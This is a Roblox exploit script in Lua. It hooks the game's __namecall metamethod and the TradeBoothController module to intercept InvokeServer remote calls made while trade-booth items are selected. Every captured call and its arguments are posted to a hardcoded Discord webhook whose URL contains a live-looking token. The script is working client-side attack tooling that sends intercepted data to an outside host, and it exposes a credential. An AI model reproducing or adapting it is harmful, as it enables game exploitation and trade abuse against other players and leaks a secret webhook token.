local RS = game:GetService("ReplicatedStorage")
local HS = game:GetService("HttpService")

local function sendWebhook(msg)
    pcall(function()
        request({
            Url = "https://discordapp.com/api/webhooks/1450517804037046508/yi2ZuXEbsPhSQU6MaJ2fgmvm4YPGSz1G0q1oHpApUiYpRrDFCAd1-kuYC4q0sxZ8YOKY",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HS:JSONEncode({content = msg})
        })
    end)
end

local listening = false
local namecallHook
namecallHook = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
    local method = getnamecallmethod()
    if method == "InvokeServer" and listening then
        local args = {...}
        local out = "InvokeServer: "..tostring(self).."\n"
        for i, v in ipairs(args) do out = out.."Arg["..i.."]: "..tostring(v).."\n" end
        sendWebhook(out)
    end
    return namecallHook(self, ...)
end))

for _, m in ipairs(getloadedmodules()) do
    if m.Name == "TradeBoothController" then
        local ok, mod = pcall(require, m)
        if ok then
            local origUpdate = mod.UpdateSelectedItem
            mod.UpdateSelectedItem = function(...)
                listening = true
                local result = origUpdate(...)
                task.delay(3, function() listening = false end)
                return result
            end
            sendWebhook("Hook siap. Buka Edit Booth, pilih item, tekan Sell.")
        end
        break
    end
end
